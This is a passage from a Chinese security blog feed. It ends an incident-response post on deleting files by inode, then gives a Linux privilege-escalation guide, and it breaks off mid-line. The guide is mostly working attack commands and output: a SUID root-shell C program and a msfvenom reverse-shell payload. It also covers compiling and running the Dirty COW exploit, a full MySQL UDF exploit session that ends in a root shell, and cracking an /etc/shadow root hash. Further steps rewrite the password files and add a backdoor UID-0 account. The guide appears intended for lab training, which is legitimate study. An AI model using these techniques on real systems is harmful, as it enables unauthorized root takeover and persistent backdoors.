id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><p>有时候，奇怪的文件名导致文件不可删除</p><p>从Windows向 Linux传输的文件或者攻击者恶意制造的文件，很多会有文件名乱码，无法直接通过乱码的文件名进行删除</p><h4 id="处置-2"><a href="#处置-2" class="headerlink" title="处置"></a>处置</h4><h5 id="使用-inode进行删除"><a href="#使用-inode进行删除" class="headerlink" title="使用 inode进行删除"></a>使用 inode进行删除</h5><p>查看 inode</p><pre class="line-numbers language-none"><code class="language-none">ls -li xxx.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除文件</p><pre class="line-numbers language-none"><code class="language-none">find ./* -inum inode -deletefind ./ -inum inode -exec rm {} \;find ./* -inum inode -exec rm -i {} \;(会有步确认是否删除)find ./* -inum inode -exec rm -f {} \;(强制删除)find ./* -inum inode |xargs rm -frm `find ./* -inum inode`<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>不同事件有不同的角度去处理问题，一次事件可能包含多种类型的事件</p><p>希望可以帮到各位师傅！</p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权小结</title>
      <link href="/2021/10/28/linux-ti-quan/"/>
      <url>/2021/10/28/linux-ti-quan/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><h1 id="0x01-一般概念"><a href="#0x01-一般概念" class="headerlink" title="0x01 一般概念"></a>0x01 一般概念</h1><p>我们在 Linux 中特权升级的最终目标是获得root用户</p><h2 id="用户、组、文件、目录"><a href="#用户、组、文件、目录" class="headerlink" title="用户、组、文件、目录"></a>用户、组、文件、目录</h2><h3 id="四者之间的关系"><a href="#四者之间的关系" class="headerlink" title="四者之间的关系"></a>四者之间的关系</h3><p>用户可以属于多个组。组可以具有多个用户。</p><p>每个文件和目录都根据用户、组和”其他用户”（所有其他用户）来定义其权限。</p><h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><p>用户帐户配置在/etc/passwd文件。</p><p>用户密码哈希存储在/etc/shadow文件中。</p><p>用户由整数用户 ID (UID)识别。</p><p>root用户帐户是 Linux 中的一种特殊类型的帐户。它的 <strong>UID 为 0</strong>，系统允许此用户访问每个文件。</p><h3 id="组"><a href="#组" class="headerlink" title="组"></a>组</h3><p>组配置在/etc/group文件中。</p><p>用户有一个主要组，并且可以有multiple二级（或补充）组。</p><p>默认情况下，用户的主要组与用户帐户的名称相同。</p><h3 id="文件和目录"><a href="#文件和目录" class="headerlink" title="文件和目录"></a>文件和目录</h3><p>所有文件和目录都有一个所有者和一个组。</p><p>权限以读取、编写和执行操作的方式定义。</p><p>有三组权限，一组为所有者，一组为组，一组为所有”其他”用户</p><p><strong>只有所有者才能更改权限</strong></p><h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><h3 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h3><p>•  Read -设置后，可以读取文件内容。</p><p>•  Write -设置后，文件 内容可以修改。</p><p>•  Execute -设置后，文件可以执行 （即作为某种过程运行 ）。</p><h3 id="目录权限"><a href="#目录权限" class="headerlink" title="目录权限"></a>目录权限</h3><p>•  Execute 设置时，目录可以输入。未经此许可，读取或写入权限均不起作用。</p><p>•  Read -设置时，目录内容可以列出。</p><p>•  Write -设置时，文件和子目录可以在目录中创建。</p><h3 id="特殊权限"><a href="#特殊权限" class="headerlink" title="特殊权限"></a>特殊权限</h3><p>•  setuid (SUID) bit</p><p>设置后，文件将使用文件所有者的权限执行。</p><p>•  setgid (SGID) bit</p><p>设置在文件上时，文件将使用文件组的权限执行。</p><p>设置在目录上时，该目录内创建的文件将继承目录本身的组。</p><h3 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h3><p>ls命令可以查看权限</p><pre class="line-numbers language-none"><code class="language-none">ls -l /bin/date<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101641726.png" alt="image-20210701131222816"></p><p>简单阐述一下： 前10个字符表示对文件设置的权限或目录。 </p><p> 第一个字符只是表示类型，例如，文件<code>d</code>的<code>-</code>用于目录</p><p>剩下的9个字符代表3组权限(所有者、组、其他)</p><p>每组包含3个字符，表示读(r)、写(w)，可执行(x)</p><p>SUID/SGID权限由中的<code>s</code>表示执行位置</p><h2 id="真实、有效和保存的UID-GID"><a href="#真实、有效和保存的UID-GID" class="headerlink" title="真实、有效和保存的UID/GID"></a>真实、有效和保存的UID/GID</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>用户是由用户ID标识的。</p><p>实际上，在Linux中，每个用户有3个用户id(real，effective，and saved)</p><p>用户的真实ID是他们的真实身份<code>/etc/passwd</code>中定义的ID</p><h3 id="继续深入"><a href="#继续深入" class="headerlink" title="继续深入"></a>继续深入</h3><p>用户的有效ID通常等于其真实ID，但是作为另一个用户执行一个进程时，有效ID被设置为该用户的真实身份。</p><p>在大多数访问控制决策中，有效ID用于验证用户，</p><p><code>whoami</code>等命令使用有效ID。</p><p>最后，保存的ID用于确保<code>SUID</code>进程</p><p>临时将用户的有效ID切换回其真实ID并返回，在不丢失原始有效ID的情况下</p><h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><h4 id="真实有效的用户-组ID："><a href="#真实有效的用户-组ID：" class="headerlink" title="真实有效的用户/组ID："></a>真实有效的用户/组ID：</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643133.png" alt="image-20210701132736765"></p><h4 id="当前进程（即我们的shell）"><a href="#当前进程（即我们的shell）" class="headerlink" title="当前进程（即我们的shell）"></a>当前进程（即我们的shell）</h4><p>真实、有效、已保存和文件系统用户/组ID</p><pre class="line-numbers language-none"><code class="language-none">cat /proc/$$/status | grep "[UG]id"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643135.png" alt="image-20210701132748704"></p><h1 id="0x02-生成外壳"><a href="#0x02-生成外壳" class="headerlink" title="0x02 生成外壳"></a>0x02 生成外壳</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>目标：生成root外壳执行<code>/bin/sh</code> 或<code> /bin/bash</code></p><h2 id="rootbash-SUID"><a href="#rootbash-SUID" class="headerlink" title="rootbash SUID"></a>rootbash SUID</h2><p>创建一个副本 </p><p>在/bin/bash可执行文件中创建一个副本 ，通常将其重命名为rootbash，确保它归根用户所有</p><p>并且设置了SUID位，只需执行rootbash文件就可以生成root的shell </p><p>使用<code>-p</code>命令行选项，可以持久，方便我们多次利用rootbash</p><h2 id="自定义可执行文件"><a href="#自定义可执行文件" class="headerlink" title="自定义可执行文件"></a>自定义可执行文件</h2><p> 可能存在某些根进程执行另一个root进程，你可以控制的过程。</p><p>这时候</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash -p"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>上一串神秘的<code>.c</code>代码</p><pre class="line-numbers language-none"><code class="language-none">gcc -o &lt;name&gt; &lt;filename.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编译后，将生成一个以root身份运行的Bash shell： </p><h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p>反向外壳 首先msfvenom，又叫毒液</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; a001.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接收shell的话 可以使用：nc或者msf中的监听(multi/handler)</p><h2 id="本地反向外壳"><a href="#本地反向外壳" class="headerlink" title="本地反向外壳"></a>本地反向外壳</h2><p>使用一个工具是</p><p><a href="https://github.com/mthbernardes/rsg">https://github.com/mthbernardes/rsg</a></p><p>接收shell的话 可以使用：nc</p><h1 id="0x03-工具"><a href="#0x03-工具" class="headerlink" title="0x03 工具"></a>0x03 工具</h1><h2 id="Linux-Smart-Enumeration"><a href="#Linux-Smart-Enumeration" class="headerlink" title="Linux Smart Enumeration"></a>Linux Smart Enumeration</h2><p>优点：靶机环境没有安装Python</p><p><code>lse.sh</code>是一个 Bash 脚本，它有多个级别， 一步一步的扩展信息</p><p><a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></p><h2 id="LinEnum"><a href="#LinEnum" class="headerlink" title="LinEnum"></a>LinEnum</h2><p>LinEnum 是一个高级 Bash 脚本，它从目标系统中提取了大量有用的信息。<br>它可以复制文件并进行导出，同时可以搜索包含关键字的文件。<br><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><p><a href="https://github.com/linted/linuxprivchecker">https://github.com/linted/linuxprivchecker</a><br><a href="https://github.com/AlessandroZ/BeRoot">https://github.com/AlessandroZ/BeRoot</a><br><a href="http://pentestmonkey.net/tools/audit/unix-privesc-check">http://pentestmonkey.net/tools/audit/unix-privesc-check</a></p><h1 id="0x04-内核漏洞"><a href="#0x04-内核漏洞" class="headerlink" title="0x04 内核漏洞"></a>0x04 内核漏洞</h1><h2 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h2><p>内核是任何操作系统的核心。<br>将其视为应用程序软件和实际计算机硬件之间的一层</p><p>但是这边注意：<strong>没有在必要的情况下，不建议使用，因为会把目标机器搞的宕机</strong></p><h2 id="查找内核漏洞"><a href="#查找内核漏洞" class="headerlink" title="查找内核漏洞"></a>查找内核漏洞</h2><ul><li><p>1.查看内核版本(uname-a)</p></li><li><p>2.查找与之相匹配的漏洞（Google, ExploitDB, GitHub）。</p></li><li><p>3.编译并运行。</p></li></ul><h2 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h2><h3 id="查看内核版本"><a href="#查看内核版本" class="headerlink" title="查看内核版本"></a>查看内核版本</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643136.png" alt="image-20210630111311891"></p><h3 id="漏洞寻找"><a href="#漏洞寻找" class="headerlink" title="漏洞寻找"></a>漏洞寻找</h3><pre class="line-numbers language-none"><code class="language-none">searchsploit Linux debian 2.6.32<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643137.png" alt="image-20210630112011959"></p><h3 id="安装漏洞建议器"><a href="#安装漏洞建议器" class="headerlink" title="安装漏洞建议器"></a>安装漏洞建议器</h3><p><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></p><p>查看参数</p><pre class="line-numbers language-none"><code class="language-none">[-h]帮助[-k]内核号[-d]打开漏洞利用下载菜单 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643138.png" alt="image-20210630112353863"></p><pre class="line-numbers language-none"><code class="language-none">./linux-exploit-suggester-2.pl -k 2.6.32<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643139.png" alt="image-20210630112537357"></p><p>可以看到有许多的Dirty COW的漏洞利用</p><h3 id="CVE-2016-5195"><a href="#CVE-2016-5195" class="headerlink" title="CVE-2016-5195"></a>CVE-2016-5195</h3><p>这里参考：<a href="https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54">https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54</a></p><p>进行编译</p><pre class="line-numbers language-none"><code class="language-none">gcc -pthread c0w.c -o c0w<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643140.png" alt="image-20210630120211277"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>python开始HTTP服务  机器通过wget下载<code>c0w.c</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643141.png" alt="image-20210630113819038"></p><p>进行编译执行</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643142.png" alt="image-20210630120237500"></p><h3 id="通过二进制文件"><a href="#通过二进制文件" class="headerlink" title="通过二进制文件"></a>通过二进制文件</h3><pre class="line-numbers language-none"><code class="language-none">/usr/bin/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="成功拿到root权限"><a href="#成功拿到root权限" class="headerlink" title="成功拿到root权限"></a>成功拿到root权限</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643143.png" alt="image-20210630120353418"></p><h1 id="0x05-服务漏洞"><a href="#0x05-服务漏洞" class="headerlink" title="0x05 服务漏洞"></a>0x05 服务漏洞</h1><h2 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h2><p>服务只是在后台运行、接受输入或执行常规任务的程序。<br>如果弱势服务以root权限运行，则利用它们可导致命令执行<br>使用 Searchsploit、谷歌和 GitHub 可以找到服务漏洞，就像使用内核漏洞一样。</p><h2 id="查找以root权限运行的服务"><a href="#查找以root权限运行的服务" class="headerlink" title="查找以root权限运行的服务"></a>查找以root权限运行的服务</h2><pre class="line-numbers language-none"><code class="language-none">ps aux | grep "^root"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="列举程序版本"><a href="#列举程序版本" class="headerlink" title="列举程序版本"></a>列举程序版本</h2><p>使用 命令行选项运行程序通常显示版本编号：</p><pre class="line-numbers language-none"><code class="language-none">&lt;program&gt; --version&lt;program&gt; -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>类似 Debian 的系统上，dpkg 可以显示已安装的程序及其版本：</p><pre class="line-numbers language-none"><code class="language-none">dpkg -l | grep &lt;program&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在使用rpm的系统上</p><pre class="line-numbers language-none"><code class="language-none">rpm –qa | grep &lt;program&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="实操-2"><a href="#实操-2" class="headerlink" title="实操"></a>实操</h2><h3 id="查看以root权限运行的服务"><a href="#查看以root权限运行的服务" class="headerlink" title="查看以root权限运行的服务"></a>查看以root权限运行的服务</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643144.png" alt="image-20210630114911170"></p><p>看到mysql数据库 在以root权限运行</p><h3 id="查看Mysqld的版本号"><a href="#查看Mysqld的版本号" class="headerlink" title="查看Mysqld的版本号"></a>查看Mysqld的版本号</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643145.png" alt="image-20210630115710381"></p><p>Mysql数据库可以用过UDF提权进行实现</p><h3 id="Mysql-UDF提权"><a href="#Mysql-UDF提权" class="headerlink" title="Mysql-UDF提权"></a>Mysql-UDF提权</h3><p><a href="https://www.exploit-db.com/exploits/1518">https://www.exploit-db.com/exploits/1518</a></p><p>安装通过共享对象运行的用户定义功能  进行提权</p><p>下载源码到靶机</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643146.png" alt="image-20210630130745288"></p><p>用法要进行一些修改</p><p>这里要提一下 </p><p>gcc编译中的选项</p><pre class="line-numbers language-none"><code class="language-none">加上 fPIC 选项生成的动态库，显然是位置无关的，这样的代码本身就能被放到线性地址空间的任意位置，无需修改就能正确执行可以理解为放宽了编译通过的维度<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">user@debian:~$ gcc -g -c raptor_udf2.c -fPICuser@debian:~$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lcuser@debian:~$ mysql -u root -pEnter password: Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 35Server version: 5.1.73-1+deb6u1 (Debian)Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.mysql&gt; use mysql;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; create table foo(line blob);Query OK, 0 rows affected (0.01 sec)mysql&gt; insert into foo values(load_file('/home/user/raptor_udf2.so'));Query OK, 1 row affected (0.00 sec)mysql&gt; select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';Query OK, 1 row affected (0.00 sec)mysql&gt; create function do_system returns integer soname 'raptor_udf2.so';Query OK, 0 rows affected (0.00 sec)mysql&gt; select do_system('cp /bin/bash /tmp/rootbash;chmod +s /tmp/rootbash');+----------------------------------------------------------------+| do_system('cp /bin/bash /tmp/rootbash;chmod +s /tmp/rootbash') |+----------------------------------------------------------------+|                                                              0 |+----------------------------------------------------------------+1 row in set (0.01 sec)mysql&gt; exitByeuser@debian:~$ /tmp/rootbash -prootbash-4.1# iduid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643147.png" alt="image-20210630133158537"></p><p>看看目标机器正在监听的端口</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643148.png" alt="image-20210630134221883"></p><p>但是它绑定到 本地主机地址：127.0.0.1 所以我们不能从外部访问它</p><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>某些情况下，root过程可能受约束于内部端口<br>如果由于某种原因，漏洞攻击不能在目标机器上本地运行，则端口可以使用SSH转发到本地机器：</p><pre class="line-numbers language-none"><code class="language-none">ssh -R &lt;kali本地端口&gt;:127.0.0.1:&lt; 目标端口 &gt;&lt;苏塞纳梅&gt;@&lt;kali本地IP&gt;ssh -R 5555:127.0.0.1:3306 root@192.168.175.130<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="0x06-脆弱的文件权限"><a href="#0x06-脆弱的文件权限" class="headerlink" title="0x06.脆弱的文件权限"></a>0x06.脆弱的文件权限</h1><h2 id="前言-4"><a href="#前言-4" class="headerlink" title="前言"></a>前言</h2><p>如果某些系统文件的权限太弱，则可以利用某些系统文件执行权限升级。<br>如果系统文件有我们可以读取的机密信息，则可用于访问root<br>如果可以写入系统文件，我们就可以修改，操作系统的工作方式并以这种方式获得root权限</p><h2 id="相关的命令"><a href="#相关的命令" class="headerlink" title="相关的命令"></a>相关的命令</h2><p>在<code>/etc:</code>中查找所有可写文件：</p><pre class="line-numbers language-none"><code class="language-none">find /etc -maxdepth 1 -writable -type f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在<code>/etc:</code>中查找所有可读文件：</p><pre class="line-numbers language-none"><code class="language-none">find /etc -maxdepth 1 -readable -type f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查找可写入的所有目录：</p><pre class="line-numbers language-none"><code class="language-none">find / -executable -writable -type d 2&gt; /dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="针对-etc-shadow-文件"><a href="#针对-etc-shadow-文件" class="headerlink" title="针对/etc/shadow 文件"></a>针对/etc/shadow 文件</h2><p><code>/etc/shadow</code>文件包含用户密码哈希值，默认情况下，除root用户外，任何用户都无法读取。</p><ul><li>思路一：<br>如果我们能够读取 /etc/shadow 文件的内容，我们也许能够破解根用户的密码哈希。</li><li>思路二：<br>如果我们能够修改/etc/shadow文件，我们可以用我们所知道的密码哈希替换root用户的密码哈希</li></ul><h3 id="实操一、"><a href="#实操一、" class="headerlink" title="实操一、"></a>实操一、</h3><h4 id="1-检查权限-etc-shadow-文件"><a href="#1-检查权限-etc-shadow-文件" class="headerlink" title="1.检查权限 /etc/shadow 文件"></a>1.检查权限 /etc/shadow 文件</h4><pre class="line-numbers language-none"><code class="language-none">ls -l /etc/shadow <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643149.png" alt="image-20210630140751442"></p><h4 id="2-提取root用户的密码哈希"><a href="#2-提取root用户的密码哈希" class="headerlink" title="2.提取root用户的密码哈希"></a>2.提取root用户的密码哈希</h4><pre class="line-numbers language-none"><code class="language-none">head -n 1 /etc/shadow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643150.png" alt="image-20210630140948488"></p><pre class="line-numbers language-none"><code class="language-none">root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-将密码哈希保存在文件中"><a href="#3-将密码哈希保存在文件中" class="headerlink" title="3.将密码哈希保存在文件中"></a>3.将密码哈希保存在文件中</h4><pre class="line-numbers language-none"><code class="language-none">echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' &gt; 'hash.txt'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643151.png" alt="image-20210630141431879"></p><h4 id="4-使用开膛手破解密码哈希"><a href="#4-使用开膛手破解密码哈希" class="headerlink" title="4.使用开膛手破解密码哈希"></a>4.使用开膛手破解密码哈希</h4><pre class="line-numbers language-none"><code class="language-none">john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643152.png" alt="image-20210630141447898"></p><h4 id="5-使用su-命令切换到root用户"><a href="#5-使用su-命令切换到root用户" class="headerlink" title="5.使用su 命令切换到root用户"></a>5.使用su 命令切换到root用户</h4><pre class="line-numbers language-none"><code class="language-none">su<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643153.png" alt="image-20210630141653620"></p><h3 id="实操二、"><a href="#实操二、" class="headerlink" title="实操二、"></a>实操二、</h3><h4 id="1-检查权限-etc-shadow-文件："><a href="#1-检查权限-etc-shadow-文件：" class="headerlink" title="1.检查权限/etc/shadow 文件："></a>1.检查权限/etc/shadow 文件：</h4><pre class="line-numbers language-none"><code class="language-none">ls -l /etc/shadow <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-复制保存-etc-shadow-的内容，以便我们以后可以恢复"><a href="#2-复制保存-etc-shadow-的内容，以便我们以后可以恢复" class="headerlink" title="2.复制保存/etc/shadow 的内容，以便我们以后可以恢复"></a>2.复制保存/etc/shadow 的内容，以便我们以后可以恢复</h4><pre class="line-numbers language-none"><code class="language-none">-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643154.png" alt="image-20210630142720204"></p><h4 id="3-生成-新的-SHA-512-密码-哈希："><a href="#3-生成-新的-SHA-512-密码-哈希：" class="headerlink" title="3.生成 新的 SHA-512 密码 哈希："></a>3.生成 新的 SHA-512 密码 哈希：</h4><pre class="line-numbers language-none"><code class="language-none">mkpasswd -m sha-512 password    $6$WLjW9I7t4e7hhgDy$5smTCs43aPOZCR3KrG.BGuyzDyjsegc3ix3lRSZfX.O26gKGsznN6x9rs6jtxh5//qEZNS2IOUCvgbUQrAU04.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>root用户的密码：password</p><h4 id="4-编辑-etc-shadow，并将根用户的密码哈希替换为我们生成的密码。"><a href="#4-编辑-etc-shadow，并将根用户的密码哈希替换为我们生成的密码。" class="headerlink" title="4.编辑/etc/shadow，并将根用户的密码哈希替换为我们生成的密码。"></a>4.编辑/etc/shadow，并将根用户的密码哈希替换为我们生成的密码。</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643155.png" alt="image-20210630144055411"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643156.png" alt="image-20210630144137065"></p><h4 id="5-使用su-命令切换到根用户"><a href="#5-使用su-命令切换到根用户" class="headerlink" title="5.使用su 命令切换到根用户"></a>5.使用su 命令切换到根用户</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643157.png" alt="image-20210630144159777"></p><h2 id="针对-etc-passwd文件"><a href="#针对-etc-passwd文件" class="headerlink" title="针对/etc/passwd文件"></a>针对/etc/passwd文件</h2><h3 id="前言-5"><a href="#前言-5" class="headerlink" title="前言"></a>前言</h3><p> <code>/etc/passwd</code>历史上包含用户密码哈希。 </p><p> <strong>为了向后兼容，如果/etc/passwd中用户行的第二个字段包含密码哈希，它优先于/etc/shadow中的哈希</strong></p><p> 如果我们可以写入<code>/etc/passwd</code>，我们就可以很容易地输入一个已知的密码散列 root用户，然后使用su命令切换到根用户。 </p><p> 或者，如果我们只能附加到文件，我们可以创建一个新的用户，为他们分配根用户ID(0)。</p><p>这是因为Linux允许多个条目，对于相同的用户名，只要用户名不同 </p><p>/etc/passwd的root帐户配置的：</p><pre class="line-numbers language-none"><code class="language-none">root:x:0:0:root:/root:/bin/bash #通常<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二个字段中的<code>x</code>指示 Linux 查找 /etc/shadow文件中的密码哈希。</p><p>在Linux的某些版本中，可以简单地删除<code>x</code>，Linux 将其解释为用户没有密码：</p><pre class="line-numbers language-none"><code class="language-none">root::0:0:root:/root:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="实操-3"><a href="#实操-3" class="headerlink" title="实操"></a>实操</h3><h4 id="检查-etc-passwd文件的权限："><a href="#检查-etc-passwd文件的权限：" class="headerlink" title="检查/etc/passwd文件的权限："></a>检查/etc/passwd文件的权限：</h4><pre class="line-numbers language-none"><code class="language-none">ls -l /etc/passwd <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643158.png" alt="image-20210630145719525"></p><h4 id="2-使用openssl生成密码哈希："><a href="#2-使用openssl生成密码哈希：" class="headerlink" title="2.使用openssl生成密码哈希："></a>2.使用openssl生成密码哈希：</h4><pre class="line-numbers language-none"><code class="language-none">openssl passwd "qwer" <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643159.png" alt="image-20210630145846124"></p><h4 id="3-编辑-etc-passwd文件"><a href="#3-编辑-etc-passwd文件" class="headerlink" title="3.编辑 /etc/passwd文件"></a>3.编辑 <code>/etc/passwd</code>文件</h4><p>输入root用户行第二个字段中的哈希：</p><pre class="line-numbers language-none"><code class="language-none">ZSL11eCDBkMnk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643160.png" alt="image-20210630145957018"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643161.png" alt="image-20210630150036456"></p><p>保存 退出</p><h4 id="4-使用su命令切换到根用户"><a href="#4-使用su命令切换到根用户" class="headerlink" title="4.使用su命令切换到根用户"></a>4.使用su命令切换到根用户</h4><pre class="line-numbers language-none"><code class="language-none">su<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643162.png" alt="image-20210630150207862"></p><p>因为优先级问题 所以机器root账户的密码是：qwer</p><h4 id="or"><a href="#or" class="headerlink" title="or"></a>or</h4><h4 id="1-创建备用根用户"><a href="#1-创建备用根用户" class="headerlink" title="1.创建备用根用户"></a>1.创建备用根用户</h4><pre class="line-numbers language-none"><code class="language-none">qwer:ZSL11eCDBkMnk:0:0:root:/root:/bin/bash<span aria-hidden="true" 